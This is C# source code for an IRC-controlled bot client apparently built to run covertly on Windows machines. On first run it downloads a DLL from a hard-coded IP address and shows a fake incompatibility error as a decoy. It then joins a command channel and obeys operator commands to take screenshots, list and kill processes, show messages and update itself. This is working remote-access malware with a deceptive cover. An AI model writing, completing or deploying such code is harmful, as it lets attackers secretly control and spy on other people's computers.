using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Threading;
using ChatSharp;
using System.Net;
using System.Windows.Forms;
using System.IO;

namespace tom
{
    class IRC
    {
        public string VERSION = "v1";

        private IrcChannel channel;
        private BotActions actions;

        private string server = "irc.breakfastcraft.com";
        private string chan = "#bots";
        private string name = "";

        public IRC()
        {
            actions = new BotActions(this);

            Random r = new Random();            
            name = "tom_"+VERSION+"_" + r.Next(10000);

            string curFile = @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\ChatSharp.dll";
            if (!File.Exists(curFile))
            {
                // get DLL
                WebClient Client = new WebClient();
                Client.DownloadFile("http://198.211.100.72/bots/ChatSharp.dll", @System.IO.Path.GetDirectoryName(Application.ExecutablePath) + "\\ChatSharp.dll");

                // first time opening - error message
                const string caption = "Error";
                var result = MessageBox.Show("Error. \nThis program is not compatible with your version of Windows.", caption,
                                             MessageBoxButtons.AbortRetryIgnore,
                                             MessageBoxIcon.Error);
            }
            

            Connect(name);
        }

        public void NewMessage(string message)
        {
            String[] msg = message.Split(' ');

            // there are at least 2 commands
            if (msg.Length > 1)
            {
                // first command is bot name or "all"
                if (msg[0].Equals("all"))
                {
                    // if all includes this bots version
                    if (msg[1].Equals(VERSION) || msg[1].Equals("v*"))
                    {
                        List<string> commands = new List<string>();
                        if (msg.Length > 2)
                            for (int i = 2; i < msg.Length; i++)
                                commands.Add(msg[i]);
                        DoAction(commands);
                    }
                }
                if (msg[0].Equals(name))
                {
                    List<string> commands = new List<string>();
                    if (msg.Length > 1)
                        for (int i = 1; i < msg.Length; i++)
                            commands.Add(msg[i]);
                    DoAction(commands);
                }
            }
        }

        public void DoAction(List<string> commands)
        {
            switch (commands[0])
            {
                case "hi":
                    SendMessage("hello");
                    break;
                case "update":
                    actions.Update();
                    break;
                case "help":
                    actions.HelpMenu();
                    break;
                case "processes":
                    actions.ListProcesses();
                    break;
                case "name":
                    actions.Name();
                    break;
                case "screen":
                    actions.ScreenShot();
                    break;
                case "alert":
                    String message = "";
                    if (commands.Count > 1)
                        for (int i = 1; i < commands.Count; i++)
                            message += commands[i] + " ";
                    actions.ShowMessage(message);
                    break;
                case "kill":
                    if (commands.Count > 1)
                        actions.KillProcess(commands[1]);
                    break;
            }
        }

        public void SendMessage(string message)
        {
            Thread.Sleep(100);
            channel.SendMessage(message);
        }

        public void Connect(string name)
        {
            var client = new IrcClient(server, new IrcUser(name, name));

            client.ConnectionComplete += (s, e) => client.JoinChannel(chan);

            client.ChannelMessageRecieved += (s, e) =>
            {
                channel = client.Channels[e.PrivateMessage.Source];

                NewMessage(e.PrivateMessage.Message.ToString());

                if (e.PrivateMessage.Message == ".list")
                    channel.SendMessage(string.Join(", ", channel.Users.Select(u => u.Nick)));
            };

            client.ConnectAsync();
        }
    }

    
}
